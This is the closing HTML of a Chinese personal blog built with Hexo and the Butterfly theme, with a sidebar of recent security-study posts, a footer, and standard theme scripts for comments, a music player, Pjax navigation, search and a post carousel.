title="【软件】cyberchef"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【软件】cyberchef"/></a><div class="content"><a class="title" href="/posts/c1e92d18/" title="【软件】cyberchef">【软件】cyberchef</a><time datetime="2026-01-12T23:52:57.000Z" title="发表于 2026-01-13 07:52:57">2026-01-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/da83febb/" title="【笔记】安卓逆向-Java"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【笔记】安卓逆向-Java"/></a><div class="content"><a class="title" href="/posts/da83febb/" title="【笔记】安卓逆向-Java">【笔记】安卓逆向-Java</a><time datetime="2026-01-08T23:29:45.000Z" title="发表于 2026-01-09 07:29:45">2026-01-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d24e3614/" title="【笔记】流量学习"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="【笔记】流量学习"/></a><div class="content"><a class="title" href="/posts/d24e3614/" title="【笔记】流量学习">【笔记】流量学习</a><time datetime="2026-01-07T04:33:24.000Z" title="发表于 2026-01-07 12:33:24">2026-01-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By luoyinhui</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.0"></script><script src="/js/main.js?v=5.5.0"></script><script src="/pluginsSrc/medium-zoom/dist/medium-zoom.min.js?v=1.1.0"></script><script src="/pluginsSrc/vanilla-lazyload/dist/lazyload.iife.min.js?v=19.1.3"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://twikoo-vercel01.vercel.app',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://twikoo-vercel01.vercel.app',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('/pluginsSrc/twikoo/dist/twikoo.all.min.js?v=1.6.44').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script id="click-heart" src="/pluginsSrc/butterfly-extsrc/dist/click-heart.min.js?v=1.1.6" async="async" mobile="false"></script><link rel="stylesheet" href="/pluginsSrc/aplayer/dist/APlayer.min.css?v=1.10.1" media="print" onload="this.media='all'"><script src="/pluginsSrc/aplayer/dist/APlayer.min.js?v=1.10.1"></script><script src="/pluginsSrc/butterfly-extsrc/metingjs/dist/Meting.min.js?v=1.1.6"></script><div class="aplayer no-destroy" id="global-aplayer"></div><script>(() => {
  const destroyAplayer = () => {
    if (window.aplayers) {
      for (let i = 0; i < window.aplayers.length; i++) {
        if (!window.aplayers[i].options.fixed) {
          window.aplayers[i].destroy()
        }
      }
    }
  }

  const runMetingJS = () => {
    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
  }

  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
})()</script><script>(function(){
  if (window.__globalAPlayer__) return;
  function init(){
    var el=document.getElementById('global-aplayer');
    if (!el || !window.APlayer) { setTimeout(init, 100); return; }
    window.__globalAPlayer__ = new APlayer({
      container: el,
      fixed: true,
      autoplay: false,
      preload: 'none',
      storageName: 'aplayer-setting-global',
      lrcType: 0,
      audio: [{
        name: '簇拥烈日的花 - 迟里乌布',
        artist: 'Unknown',
        url: '/audio/flower.flac',
        cover: '/img/music-cover.png',
        type: 'auto'
      }]
    });
    try { window.__globalAPlayer__.audio && (window.__globalAPlayer__.audio.playbackRate = 1) } catch(e){}
  }
  init();
})()</script><script src="/pluginsSrc/pjax/pjax.min.js?v=0.2.8"></script><script>(() => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => {
      try {
        fn()
      } catch (err) {
        console.debug('Pjax callback failed:', err)
      }
    })
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      const usePjax = true
      false
        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
        : window.location.href = e.request.responseURL
    }
  })
})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-switch"><span class="search-switch-item active" data-type="local">本地搜索</span><span class="search-switch-item" data-type="algolia">Algolia</span></div><div id="local-search-panel"><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"></div><hr><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="algolia-search-panel" style="display:none"><div id="algolia-search-input"><div class="ais-SearchBox"><form class="ais-SearchBox-form" action="" role="search" novalidate=""><input class="ais-SearchBox-input" type="search" placeholder="搜索文章" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="512" aria-label="Search"><button class="ais-SearchBox-submit" type="submit" title="Submit the search query" style="display:none;"><svg class="ais-SearchBox-submitIcon" width="10" height="10" viewBox="0 0 40 40" aria-hidden="true"><path d="M26.804 29.01c-2.832 2.34-6.465 3.746-10.426 3.746C7.333 32.756 0 25.424 0 16.378 0 7.333 7.333 0 16.378 0c9.046 0 16.378 7.333 16.378 16.378 0 3.96-1.406 7.594-3.746 10.426l10.534 10.534c.607.607.61 1.59-.004 2.202-.61.61-1.597.61-2.202.004L26.804 29.01zm-10.426.627c7.323 0 13.26-5.936 13.26-13.26 0-7.32-5.937-13.257-13.26-13.257C9.056 3.12 3.12 9.056 3.12 16.378c0 7.323 5.936 13.26 13.258 13.26z"></path></svg></button></form></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"><div id="algolia-hits-empty" style="display:none;"></div><div class="ais-Hits" style="display:none;"><ol class="ais-Hits-list"></ol></div></div></div><div class="ais-Pagination" id="algolia-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="algolia-info"><span class="ais-Stats-text"></span><span class="algolia-poweredBy-text">Search powered by Algolia</span></div></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.0"></script><script src="/pluginsSrc/algoliasearch/dist/lite/builds/browser.umd.js?v=5.37.0"></script><script src="/js/search/algolia.js?v=5.5.0"></script></div><!-- hexo injector body_end start --><script>window.toggleHistory = function(btn) {
  var history = document.getElementById('updates-history');
  if (history.style.display === 'none') {
    history.style.display = 'block';
    btn.innerText = '收起';
  } else {
    history.style.display = 'none';
    btn.innerText = '显示更多';
  }
}
</script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item swiper-outer" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="background:url(../assets/preview.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-12-30</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/35b57171/&quot;);" href="javascript:void(0);" alt="">【项目】hexo-butterfly-updates-heatmap插件介绍</a><div class="blog-slider__text">参考语雀热力图制作的hexo热力图插件~~（嘶后面发现和github热力图也很像）</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(/img/shouye.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-10-01</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/ef1d4e7/&quot;);" href="javascript:void(0);" alt="">【笔记】markdown-github+vscode使用文档</a><div class="blog-slider__text">markdown语法在基于github+vscode背景下的使用与探索笔记</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(/img/shouye.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-12-31</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/989aec00/&quot;);" href="javascript:void(0);" alt="">【刷题】青少年靶场练习</a><div class="blog-slider__text">初步接触应急响应题目，跟随强帝步伐嘻嘻~~</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(/img/shouye.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-08-16</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/c3315bb0/&quot;);" href="javascript:void(0);" alt="">【笔记】十六进制文件头尾特征</a><div class="blog-slider__text">重要的misc知识点！！！</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(/img/shouye.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2025-11-28</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/f2309c58/&quot;);" href="javascript:void(0);" alt="">任务清单</a><div class="blog-slider__text">什么？！我还有那么多活没干呀，快干！！！</div></div></div><div class="blog-slider__item swiper-slide" style="background:url(/img/shouye.png);border-radius:0;opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><div class="blog-slider__content"><span class="blog-slider__code">2026-01-02</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;posts/eb9d2e41/&quot;);" href="javascript:void(0);" alt="">阶段小结</a><div class="blog-slider__text">乱七八糟没有逻辑的反思，要是不小心折磨了你的眼睛非常抱歉ㅍ_ㅍ</div></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div><div class="swiper-button-prev"></div><div class="swiper-button-next"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = '/links/,/link/'.split(',');
  var cpage = location.pathname;
  var epage = '/';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="/js/swiper/swiper.min.js"></script><script defer data-pjax src="/js/swiper/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>